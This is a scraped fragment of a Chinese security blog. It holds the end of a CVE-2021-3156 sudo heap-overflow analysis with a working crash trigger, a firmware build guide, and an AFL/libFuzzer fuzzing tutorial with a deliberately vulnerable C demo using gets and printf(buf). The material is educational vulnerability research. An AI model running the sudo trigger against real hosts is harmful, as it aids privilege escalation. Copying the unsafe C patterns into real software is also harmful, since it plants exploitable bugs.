堆缓冲区大小size由计算存储命令参数字符串所需的总字节数得到： 1 2 3 /* Alloc and build up user_args. */ for (size = 0, av = NewArgv + 1; *av; av++) size += strlen(*av) + 1; 那么向user_args堆块中写入过量的数据，则造成堆溢出。\n且慢！单看这里的代码的确有问题，但我们假设的以单一一个 \\ 结尾的字符串真的能传递到这里来吗？\n毕竟如果是两个 \\ 结尾的字符串，则*from == \\x00时则正确命中while判断，程序不会出错。\n而前面parse_args函数做的处理，正是会将 \\ 前面再添加上一个转义符 \\ 的呀。\n那这里为啥会成功触发错误？先揭晓下答案，再针对其进行分析：\n1 2 3 4 5 ➜ sudo git:(master) ✗ LD_LIBRARY_PATH=./lib/util/.libs/ src/.libs/sudoedit -s \u0026#39;\\\u0026#39; malloc(): corrupted top size [1] 1383588 abort (core dumped) LD_LIBRARY_PATH=./lib/util/.libs/ src/.libs/sudoedit -s \u0026#39;\\\u0026#39; ➜ sudo git:(master) ✗ LD_LIBRARY_PATH=./lib/util/.libs/ src/.libs/sudo -s \u0026#39;\\\u0026#39; zsh:1: command not found: \\ 文章前半部分为sudo建立了一个符号链接sudoedit，可以看到此时使用sudoedit执行就能成功触发漏洞，但使用原本的sudo则不可以。所以代码中肯定有逻辑对于启动时不同的程序名称做出了判断，进而执行了不同逻辑。\n回到源代码中，我们观察到parse_args函数添加转义符的触发条件和set_cmnd函数取消转义符的触发条件是不同的：\nparse_args 1 if (ISSET(mode, MODE_RUN) \u0026amp;\u0026amp; ISSET(flags, MODE_SHELL)) { set_cmnd 1 2 if (sudo_mode \u0026amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) { if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) { 即：\n添加转义符操作需满足mode设置了MODE_RUN，且flags设置了MODE_SHELL 取消转义符操作需sudo_mode设置了(MODE_RUN|MODE_EDIT|MODE_CHECK) \u0026amp;\u0026amp; (MODE_SHELL|MODE_LOGIN_SHELL) 那么想要达成不执行添加转义符的操作，且执行取消转义符的操作的目的，就需要满足：\n1 MODE_SHELL \u0026amp;\u0026amp; !MODE_RUN \u0026amp;\u0026amp; (MODE_EDIT || MODE_CHECK) 看来需要寻找MODE_EDIT与MODE_CHECK从何而来了。\n从parse_args中可知，它们来自于-e和-l参数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 int parse_args(int argc, char **argv, int *old_optind, int *nargc, char ***nargv, struct sudo_settings **settingsp, char ***env_addp) { // ... for (;;) { if ((ch = getopt_long(argc, argv, short_opts, long_opts, NULL)) != -1) { switch (ch) { // ... case \u0026#39;e\u0026#39;: if (mode \u0026amp;\u0026amp; mode != MODE_EDIT) usage_excl(); // 设置 mode 为 MODE_EDIT mode = MODE_EDIT; sudo_settings[ARG_SUDOEDIT].value = \u0026#34;true\u0026#34;; valid_flags = MODE_NONINTERACTIVE; break; // ... case \u0026#39;l\u0026#39;: if (mode) { if (mode == MODE_LIST) SET(flags, MODE_LONG_LIST); else usage_excl(); } // 设置 mode 为 MODE_LIST mode = MODE_LIST; valid_flags = MODE_NONINTERACTIVE | MODE_LONG_LIST; break; // ... } } // ... } // ... // 在此处将 MODE_LIST 更新为 MODE_CHECK if (argc \u0026gt; 0 \u0026amp;\u0026amp; mode == MODE_LIST) mode = MODE_CHECK; // ... // 必须绕过的特殊判断条件 if ((flags \u0026amp; valid_flags) != flags) usage(); // ... } 它们的作用：\n1 2 -e, --edit edit files instead of running a command -l, --list list user\u0026#39;s privileges or check a specific command; use twice for longer format 由此看来，发现不妙：\n从功能描述上，-e、-l参数的功能和-s、-i参数的功能是冲突的，估计没法一起用 从源代码上看来，的确如此。通过-e、-l参数设定valid_flags变量，并进行如下判断的手法，sudo规避了上述用法，并向用户打印了usage教你怎么用它： 1 2 if ((flags \u0026amp; valid_flags) != flags) usage(); 绕过的方法呢？上文已经揭晓过了。使用sudoedit作为程序名调用sudo，能起到和sudo -e一样的效果，却不会进入parse_args中的这段判断逻辑中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 int parse_args(int argc, char **argv, int *old_optind, int *nargc, char ***nargv, struct sudo_settings **settingsp, char ***env_addp) { /* First, check to see if we were invoked as \u0026#34;sudoedit\u0026#34;. */ // 如果以 sudoedit 作为程序名 proglen = strlen(progname); if (proglen \u0026gt; 4 \u0026amp;\u0026amp; strcmp(progname + proglen - 4, \u0026#34;edit\u0026#34;) == 0) { progname = \u0026#34;sudoedit\u0026#34;; // 则设置 mode 为 MODE_EDIT mode = MODE_EDIT; // 注意之后就没有再设置 valid_flags了 sudo_settings[ARG_SUDOEDIT].value = \u0026#34;true\u0026#34;; } } 由此，到达漏洞点的路径就通畅了。\n","date":"2022-05-13T23:02:59+08:00","image":"https://s2.loli.net/2022/05/19/FeqdKtWJZ3GonMX.png","permalink":"https://cerr.cc/post/cve-2021-3156-sudo-%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"CVE-2021-3156 sudo 提权漏洞分析"},{"content":"获取梅林 官网如下：asuswrt-merlin.net\n新梅林：https://github.com/RMerl/asuswrt-merlin.ng\n旧梅林（停止开发）：https://github.com/RMerl/asuswrt-merlin\n这里选用asuswrt-merlin.ng进行编译构建\n1 wget https://github.com/RMerl/asuswrt-merlin.ng/archive/refs/heads/master.zip （下载zip而非clone仓库，节省.git的占用\n环境准备 README.txt 给出了编译方式：https://github.com/RMerl/asuswrt-merlin.ng/blob/master/README.TXT\n包依赖非常多，所以尽力将本地环境贴合它的编译说明，以避免未知错误。\n所以选取 ubuntu:16.04 作为编译平台。\n故首先安装docker，快速安装cheatsheet在此：http://zikey.vip/post/some_installation/\n拉取ubuntu 16.04镜像并设定共享文件夹：\n1 sudo docker run -it -v /home/zkv/docker_share/:/share ubuntu:16.04 依赖安装 进入docker ubuntu环境后，下载并解压梅林ng：\n1 2 3 apt install wget unzip wget https://github.com/RMerl/asuswrt-merlin.ng/archive/refs/heads/master.zip unzip master.zip README.txt 中提到，需安装部分32位依赖包，故先添加32位软件源：\n1 2 dpkg --add-architecture i386 apt update 此后便可以直接依照说明安装所有依赖包：\n1 apt install libncurses5 libncurses5-dev m4 bison gawk flex libstdc++6-4.7-dev g++-4.7 g++ gengetopt git gitk zlib1g-dev autoconf autopoint libtool-bin shtool autogen mtd-utils intltool sharutils docbook-xsl-* libstdc++5 texinfo dos2unix xsltproc u-boot-tools device-tree-compiler qemu gperf liblzo2-dev uuid-dev build-essential lzma-dev liblzma-dev lzma binutils-dev patch cmake intltool libglib2.0-dev gtk-doc-tools libc6-i386 lib32stdc++6 lib32z1 libelf1:i386 lib32ncurses5 libc6-dev-i386 接着获取梅林提供的编译工具链：\n1 2 cd $HOME git clone https://github.com/RMerl/am-toolchains 将工具链目录导出至环境变量，参见 https://github.com/RMerl/asuswrt-merlin.ng/wiki/Compile-Firmware-from-source：\n我这里的目标是 RT-AC86U，故：\n1 2 3 4 5 sudo ln -s ~/am-toolchains/brcm-arm-hnd /opt/toolchains echo \u0026#34;export LD_LIBRARY_PATH=\\$LD_LIBRARY:/opt/toolchains/crosstools-arm-gcc-5.3-linux-4.1-glibc-2.22-binutils-2.25/usr/lib\u0026#34; \u0026gt;\u0026gt; ~/.profile echo \u0026#34;export TOOLCHAIN_BASE=/opt/toolchains\u0026#34; \u0026gt;\u0026gt; ~/.profile echo \u0026#34;PATH=\\$PATH:/opt/toolchains/crosstools-arm-gcc-5.3-linux-4.1-glibc-2.22-binutils-2.25/usr/bin\u0026#34; \u0026gt;\u0026gt; ~/.profile echo \u0026#34;PATH=\\$PATH:/opt/toolchains/crosstools-aarch64-gcc-5.3-linux-4.1-glibc-2.22-binutils-2.25/usr/bin\u0026#34; \u0026gt;\u0026gt; ~/.profile 开始编译 1 2 cd ~/release/src-rt-5.02hnd make rt-ac86u Easymod 如上所述手动折腾到一半，发现了有简单模式的自动化方案。README内的信息实在太少，github wiki里有官方的编译构建教程：\n官方wiki：\nhttps://github.com/RMerl/asuswrt-merlin.ng/wiki/\n组件编译：\nhttps://github.com/RMerl/asuswrt-merlin.ng/wiki/Compile-custom-programs-from-source\n固件编译：\nhttps://github.com/RMerl/asuswrt-merlin.ng/wiki/Compile-Firmware-from-source\n同时有现成的docker环境：\nhttps://github.com/gnuton/Asuswrt-Merlin-Toolchains-Docker\n前面，白干。\n","date":"2022-05-11T16:27:10+08:00","image":"https://www.asuswrt-merlin.net/sites/default/files/inline-images/main_page_sm_2.png","permalink":"https://cerr.cc/post/%E5%8D%8E%E7%A1%95%E6%A2%85%E6%9E%97%E5%9B%BA%E4%BB%B6%E7%9A%84%E7%BC%96%E8%AF%91/","title":"华硕梅林固件的编译"},{"content":"\\x00 早教教程 教程 谷歌的Fuzzing教程\nFuzzingbook\n课程 南京大学：软件分析\n南京大学：软件分析课程视频\n博文 Fuzzing技术发展的这30年\n一些值得学习的Fuzzer开源项目\nFuzzing战争: 从刀剑弓斧到星球大战\nFuzzing战争系列之二：不畏浮云遮望眼\n练兵场 Fuzzing101\n兵器 AFL\nAFLplusplus\n资源 https://github.com/secfigo/Awesome-Fuzzing\n论文 开山 1988年，在威斯康星大学Barton Miller教授的计算机实验课上，首次提出Fuzz生成器(Fuzz Generator)的概念，用于测试Unix程序的健壮性，即用随机数据来测试程序直至崩溃。因此，Barton Miller教授也被多数人尊称为”模糊测试之父”。\nhttp://pages.cs.wisc.edu/~bart/fuzz/CS736-Projects-f1988.pdf\n代码覆盖引导Fuzzing之AFL \\x01 学步车AFL初探 最简单的 fuzzing demo 使用AFL，故先安装：\n1 2 3 4 git clone https://github.com/google/AFL.git cd AFL make -j`nproc` sudo make install 接着准备被测程序源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;signal.h\u0026gt; int vuln(char *str) { int len = strlen(str); if(str[0] == \u0026#39;A\u0026#39; \u0026amp;\u0026amp; len == 66) raise(SIGSEGV); else if(str[0] == \u0026#39;F\u0026#39; \u0026amp;\u0026amp; len == 6) raise(SIGSEGV); else puts(\u0026#34;\\nnothing happened\u0026#34;); return 0; } int main(int argc, char *argv[]) { char buf[100]={0}; gets(buf); printf(buf); vuln(buf); return 0; } 使用afl-gcc插装编译：\n1 afl-gcc vulner.c -o vulner 准备fuzzing输入与输出的文件夹：\n1 mkdir fuzz_in fuzz_out 创建两个样例输入：\n1 2 echo -n AAAA \u0026gt; fuzz_in/input_case_1 echo -e -n \u0026#34;\\x01\\x02\\x03\\x04\u0026#34; \u0026gt; fuzz_in/input_case_2 启动fuzzing：\n1 afl-fuzz -i fuzz_in -o fuzz_out ./vulner Ctrl+C停止后，由fuzzing_out中拿到fuzzing结果。用其中的一个crash输入测试下：\n1 2 3 4 5 ➜ ./vulner \u0026lt; fuzz_out/crashes/id:000000,sig:06,src:000000,op:havoc,rep:32 6666 nothing happened *** stack smashing detected ***: terminated [1] 1541204 abort ./vulner \u0026lt; fuzz_out/crashes/id:000000,sig:06,src:000000,op:havoc,rep:32 可以看到发生了栈溢出。\n为学步车装上名为sanitizers的轮子 借助于sanitizers获得更多崩溃的详细信息：\n开启AddressSanitizer重新编译程序：\n1 afl-clang -fsanitize=address vulner.c -o vulner 使用上一部分相同的crash输入用例，来测试打开了AddressSanitizer的程序：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 ➜ ./vulner \u0026lt; fuzz_out/crashes/id:000000,sig:06,src:000000,op:havoc,rep:32 ================================================================= ==1541245==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffe9090e564 at pc 0x0000004393cb bp 0x7ffe9090e3a0 sp 0x7ffe9090db28 READ of size 116 at 0x7ffe9090e564 thread T0 #0 0x4393ca in printf_common(void*, char const*, __va_list_tag*) (/f/lab/fuzzing_baby/vulner+0x4393ca) #1 0x43af1e in printf (/f/lab/fuzzing_baby/vulner+0x43af1e) #2 0x4c3418 in main /root/lab/fuzzing_baby/vulner.c:17:5 #3 0x7f09a7252082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 #4 0x41b33d in _start (/f/lab/fuzzing_baby/vulner+0x41b33d) Address 0x7ffe9090e564 is located in stack of thread T0 at offset 132 in frame #0 0x4c32cf in main /root/lab/fuzzing_baby/vulner.c:14 This frame has 1 object(s): [32, 132) \u0026#39;buf\u0026#39; (line 15) \u0026lt;== Memory access at offset 132 overflows this variable HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork (longjmp and C++ exceptions *are* supported) SUMMARY: AddressSanitizer: stack-buffer-overflow (/f/lab/fuzzing_baby/vulner+0x4393ca) in printf_common(void*, char const*, __va_list_tag*) Shadow bytes around the buggy address: 0x100052119c50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100052119c60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100052119c70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100052119c80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100052119c90: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 =\u0026gt;0x100052119ca0: 00 00 00 00 00 00 00 00 00 00 00 00[04]f3 f3 f3 0x100052119cb0: f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 0x100052119cc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100052119cd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100052119ce0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100052119cf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==1541245==ABORTING 由此得到了crash的详细信息输出。\n黑盒测试QEMU mode——拆走源码の轮儿 AFL的QEMU mode不会默认安装，而是需要我们手动安装：\n1 2 3 4 5 sudo apt install libtool libtool-bin libcapstone-dev cd AFL/qemu_mode ./build_qemu_support.sh cd .. sudo make install 如果遇到编译错误，可以使用这份fork：https://github.com/blurbdust/AFL.git\n不插桩重新编译程序：\n1 gcc vulner.c -o vulner 开始QEMU mode黑盒fuzzing\n1 afl-fuzz -Q -i fuzz_in -o fuzz_out ./vulner AFL并发——学步车的四缸引擎 通过-M指定master fuzzer进程，-S指定一系列slave fuzzer进程即可。四核机器就：\n1 2 3 4 afl-fuzz -i fuzz_in -o fuzz_out -M fuzzer1 ./vulner afl-fuzz -i fuzz_in -o fuzz_out -S fuzzer2 ./vulner afl-fuzz -i fuzz_in -o fuzz_out -S fuzzer3 ./vulner afl-fuzz -i fuzz_in -o fuzz_out -S fuzzer4 ./vulner Fuzzing capstone using AFL persistent mode Ref：https://toastedcornflakes.github.io/articles/fuzzing_capstone_with_afl.html\n获取受害者capstone：\n1 git clone https://github.com/capstone-engine/capstone.git \\x02 libFuzzer初探 环境准备 LibFuzzer is an in-process, coverage-guided, evolutionary fuzzing engine.\n官方文档 Google的libFuzzer教程 ☝️接下来读一练二\n将教程仓库clone下来：\n1 git clone https://github.com/google/fuzzing.git fuzzing 由于：\nRecent versions of Clang (starting from 6.0) include libFuzzer, and no extra installation is necessary.\n所以可以直接测试一下环境是否就绪：\n1 2 clang++ -g -fsanitize=address,fuzzer fuzzing/tutorial/libFuzzer/fuzz_me.cc ./a.out 2\u0026gt;\u0026amp;1 | grep ERROR 我得到了：\n1 ==2118349==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200003d473 at pc 0x000000550453 bp 0x7fff521da530 sp 0x7fff521da528 看来没问题，继续前进。\n火花塞打火——demo拆解 样例程序如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stddef.h\u0026gt; bool FuzzMe(const uint8_t *Data, size_t DataSize) { return DataSize \u0026gt;= 3 \u0026amp;\u0026amp; Data[0] == \u0026#39;F\u0026#39; \u0026amp;\u0026amp; Data[1] == \u0026#39;U\u0026#39; \u0026amp;\u0026amp; Data[2] == \u0026#39;Z\u0026#39; \u0026amp;\u0026amp; Data[3] == \u0026#39;Z\u0026#39;; // :‑\u0026lt; } extern \u0026#34;C\u0026#34; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) { FuzzMe(Data, Size); return 0; } 使用libFuzzer时我们的Fuzz目标是？\nDefinition: a fuzz target is a function that has the following signature and does something interesting with it\u0026rsquo;s arguments:\n1 2 3 4 extern \u0026#34;C\u0026#34; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) { DoSomethingWithData(Data, Size); return 0; } 所以对于样例程序，我们先准备好待测函数：\n1 2 3 4 5 6 7 bool FuzzMe(const uint8_t *Data, size_t DataSize) { return DataSize \u0026gt;= 3 \u0026amp;\u0026amp; Data[0] == \u0026#39;F\u0026#39; \u0026amp;\u0026amp; Data[1] == \u0026#39;U\u0026#39; \u0026amp;\u0026amp; Data[2] == \u0026#39;Z\u0026#39; \u0026amp;\u0026amp; Data[3] == \u0026#39;Z\u0026#39;; // :‑\u0026lt; } 在为其准备fuzz wrapper函数：\n1 2 3 4 extern \u0026#34;C\u0026#34; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) { FuzzMe(Data, Size); return 0; } 使用版本6以上的clang，开启如下三个选项进行编译：\n-fsanitize=fuzzer (required): provides in-process coverage information to libFuzzer and links with the libFuzzer runtime. -fsanitize=address (recommended): enables AddressSanitizer -g (recommended): enables debug info, makes the error messages easier to read. 1 clang++ -g -fsanitize=address,fuzzer fuzzing/tutorial/libFuzzer/fuzz_me.cc 运行编译出的程序，即输出了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 ➜ fuzzing git:(master) ✗ ./a.out INFO: Seed: 122504861 INFO: Loaded 1 modules (7 inline 8-bit counters): 7 [0x5a6eb0, 0x5a6eb7), INFO: Loaded 1 PC tables (7 PCs): 7 [0x56b140,0x56b1b0), INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes INFO: A corpus is not provided, starting from an empty corpus #2 INITED cov: 3 ft: 3 corp: 1/1b exec/s: 0 rss: 27Mb #3 NEW cov: 4 ft: 4 corp: 2/5b lim: 4 exec/s: 0 rss: 27Mb L: 4/4 MS: 1 CrossOver- #13 REDUCE cov: 4 ft: 4 corp: 2/4b lim: 4 exec/s: 0 rss: 27Mb L: 3/3 MS: 5 ChangeBit-ShuffleBytes-ChangeByte-CrossOver-CrossOver- #446 REDUCE cov: 5 ft: 5 corp: 3/7b lim: 8 exec/s: 0 rss: 27Mb L: 3/3 MS: 3 ChangeByte-CopyPart-CMP- DE: \u0026#34;F\\x00\u0026#34;- #4543 NEW cov: 6 ft: 6 corp: 4/11b lim: 48 exec/s: 0 rss: 27Mb L: 4/4 MS: 2 InsertByte-ChangeByte- #4880 REDUCE cov: 6 ft: 6 corp: 4/10b lim: 48 exec/s: 0 rss: 27Mb L: 3/3 MS: 2 ChangeByte-EraseBytes- #7716 REDUCE cov: 7 ft: 7 corp: 5/14b lim: 74 exec/s: 0 rss: 27Mb L: 4/4 MS: 1 InsertByte- ================================================================= ==2119678==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020000303f3 at pc 0x000000550453 bp 0x7fffcad0db90 sp 0x7fffcad0db88 READ of size 1 at 0x6020000303f3 thread T0 #0 0x550452 in FuzzMe(unsigned char const*, unsigned long) /root/lab/fuzzing_baby/fuzzing/tutorial/libFuzzer/fuzz_me.cc:9:7 #1 0x5504f4 in LLVMFuzzerTestOneInput /root/lab/fuzzing_baby/fuzzing/tutorial/libFuzzer/fuzz_me.cc:13:3 #2 0x458671 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/f/lab/fuzzing_baby/fuzzing/a.out+0x458671) #3 0x457db5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) (/f/lab/fuzzing_baby/fuzzing/a.out+0x457db5) #4 0x45a057 in fuzzer::Fuzzer::MutateAndTestOne() (/f/lab/fuzzing_baby/fuzzing/a.out+0x45a057) #5 0x45ad55 in fuzzer::Fuzzer::Loop(std::__Fuzzer::vector\u0026lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator\u0026lt;fuzzer::SizedFile\u0026gt; \u0026gt;\u0026amp;) (/f/lab/fuzzing_baby/fuzzing/ a.out+0x45ad55) #6 0x44970e in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/f/lab/fuzzing_baby/fuzzing/a.out+0x44970e) #7 0x472552 in main (/f/lab/fuzzing_baby/fuzzing/a.out+0x472552) #8 0x7f9d13710082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 #9 0x41e4ad in _start (/f/lab/fuzzing_baby/fuzzing/a.out+0x41e4ad) 0x6020000303f3 is located 0 bytes to the right of 3-byte region [0x6020000303f0,0x6020000303f3) allocated by thread T0 here: #0 0x51e1dd in malloc (/f/lab/fuzzing_baby/fuzzing/a.out+0x51e1dd) #1 0x432897 in operator new(unsigned long) (/f/lab/fuzzing_baby/fuzzing/a.out+0x432897) #2 0x457db5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) (/f/lab/fuzzing_baby/fuzzing/a.out+0x457db5) #3 0x45a057 in fuzzer::Fuzzer::MutateAndTestOne() (/f/lab/fuzzing_baby/fuzzing/a.out+0x45a057) #4 0x45ad55 in fuzzer::Fuzzer::Loop(std::__Fuzzer::vector\u0026lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator\u0026lt;fuzzer::SizedFile\u0026gt; \u0026gt;\u0026amp;) (/f/lab/fuzzing_baby/fuzzing/ a.out+0x45ad55) #5 0x44970e in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/f/lab/fuzzing_baby/fuzzing/a.out+0x44970e) #6 0x472552 in main (/f/lab/fuzzing_baby/fuzzing/a.out+0x472552) #7 0x7f9d13710082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 SUMMARY: AddressSanitizer: heap-buffer-overflow /root/lab/fuzzing_baby/fuzzing/tutorial/libFuzzer/fuzz_me.cc:9:7 in FuzzMe(unsigned char const*, unsigned long ) Shadow bytes around the buggy address: 0x0c047fffe020: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa 0x0c047fffe030: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa 0x0c047fffe040: fa fa fd fa fa fa fd fd fa fa fd fa fa fa fd fa 0x0c047fffe050: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa 0x0c047fffe060: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa =\u0026gt;0x0c047fffe070: fa fa fd fd fa fa fd fd fa fa fd fa fa fa[03]fa 0x0c047fffe080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fffe090: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fffe0a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fffe0b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fffe0c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==2119678==ABORTING MS: 1 EraseBytes-; base unit: 9a96b9fc7e2f4543fde6948573fd8bb47ec80fd0 0x46,0x55,0x5a, FUZ artifact_prefix=\u0026#39;./\u0026#39;; Test unit written to ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60 同时生成了触发如上crash的输入crash-0eb8e4ed029b774d80f2b66408203801cb982a60，内容为：\n1 2 3 ➜ fuzzing git:(master) ✗ hd crash-0eb8e4ed029b774d80f2b66408203801cb982a60 00000000 46 55 5a |FUZ| 00000003 使用其复现漏洞：\n1 ./a.out \u0026lt; crash-0eb8e4ed029b774d80f2b66408203801cb982a60 由此便是借助libFuzzer完成的最简单的Fuzzing与找到的漏洞。\n下赛道后的复盘——fuzzing输出解析 1 INFO: Seed: 3918206239 The fuzzer has started with this random seed. Rerun it with -seed=3918206239 to get the same result.\n1 2 INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes INFO: A corpus is not provided, starting from an empty corpus By default, libFuzzer assumes that all inputs are 4096 bytes or smaller. To change that either use -max_len=N or run with a non-empty seed corpus.\n1 2 3 4 5 6 #0 READ units: 1 #1 INITED cov: 3 ft: 3 corp: 1/1b exec/s: 0 rss: 26Mb #8 NEW cov: 4 ft: 4 corp: 2/29b exec/s: 0 rss: 26Mb L: 28 MS: 2 InsertByte-InsertRepeatedBytes- #3405 NEW cov: 5 ft: 5 corp: 3/82b exec/s: 0 rss: 27Mb L: 53 MS: 4 InsertByte-EraseBytes-... #8664 NEW cov: 6 ft: 6 corp: 4/141b exec/s: 0 rss: 27Mb L: 59 MS: 3 CrossOver-EraseBytes-... #272167 NEW cov: 7 ft: 7 corp: 5/201b exec/s: 0 rss: 51Mb L: 60 MS: 1 InsertByte- libFuzzer has tried at least 272167 inputs (#272167) and has discovered 5 inputs of 201 bytes total (corp: 5/201b) that together cover 7 coverage points (cov: 7). You may think of coverage points as of basic blocks in the code.\n1 2 3 4 ==2335==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000155c13 at pc 0x0000004ee637... READ of size 1 at 0x602000155c13 thread T0 #0 0x4ee636 in FuzzMe(unsigned char const*, unsigned long) fuzzing/tutorial/libFuzzer/fuzz_me.cc:10:7 #1 0x4ee6aa in LLVMFuzzerTestOneInput fuzzing/tutorial/libFuzzer/fuzz_me.cc:14:3 On one of the inputs AddressSanitizer has detected a heap-buffer-overflow bug and aborted the execution.\n1 artifact_prefix=\u0026#39;./\u0026#39;; Test unit written to ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60 Before exiting the process libFuzzer has created a file on disc with the bytes that triggered the crash.\n驾校实习——CVE-2014-0160 见CVE-2014-0160分析\n种子语料库 使用谷歌的教程仓库实验：\n1 2 3 git clone https://github.com/google/fuzzer-test-suite.git mkdir woff; cd woff; ../fuzzer-test-suite/woff2-2016-05-06/build.sh 开始运行fuzzer：\n1 ./woff2-2016-05-06-fsanitize_fuzzer Most likely you will see that the fuzzer is stuck \u0026ndash; it is running millions of inputs but can not find many new code paths.\n1 2 3 4 5 6 7 8 #1 INITED cov: 18 ft: 15 corp: 1/1b exec/s: 0 rss: 27Mb #15 NEW cov: 23 ft: 16 corp: 2/5b exec/s: 0 rss: 27Mb L: 4 MS: 4 InsertByte-... #262144 pulse cov: 23 ft: 16 corp: 2/5b exec/s: 131072 rss: 45Mb #524288 pulse cov: 23 ft: 16 corp: 2/5b exec/s: 131072 rss: 62Mb #1048576 pulse cov: 23 ft: 16 corp: 2/5b exec/s: 116508 rss: 97Mb #2097152 pulse cov: 23 ft: 16 corp: 2/5b exec/s: 110376 rss: 167Mb #4194304 pulse cov: 23 ft: 16 corp: 2/5b exec/s: 107546 rss: 306Mb #8388608 pulse cov: 23 ft: 16 corp: 2/5b exec/s: 106184 rss: 584Mb The first step you should make in such case is to find some inputs that trigger enough code paths \u0026ndash; the more the better. The woff2 fuzz target consumes web fonts in .woff2 format and so you can just find any such file(s). The build script you have just executed has downloaded a project with some .woff2 files and placed it into the directory ./seeds/. Inspect this directory. What do you see? Are there any .woff2 files?\nNow you can use the woff2 fuzzer with a seed corpus. Do it like this:\n1 2 mkdir MY_CORPUS ./woff2-2016-05-06-fsanitize_fuzzer MY_CORPUS/ seeds/ When a libFuzzer-based fuzzer is executed with one more directory as arguments, it will first read files from every directory recursively and execute the target function on all of them. Then, any input that triggers interesting code path(s) will be written back into the first corpus directory (in this case, MY_CORPUS).\nLet us look at the output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 INFO: Seed: 3976665814 INFO: Loaded 1 modules (9611 inline 8-bit counters): 9611 [0x93c710, 0x93ec9b), INFO: Loaded 1 PC tables (9611 PCs): 9611 [0x6e8628,0x70ded8), INFO: 0 files found in MY_CORPUS/ INFO: 62 files found in seeds/ INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 168276 bytes INFO: seed corpus: files: 62 min: 14b max: 168276b total: 3896056b rss: 37Mb #63 INITED cov: 632 ft: 1096 corp: 13/766Kb exec/s: 0 rss: 61Mb 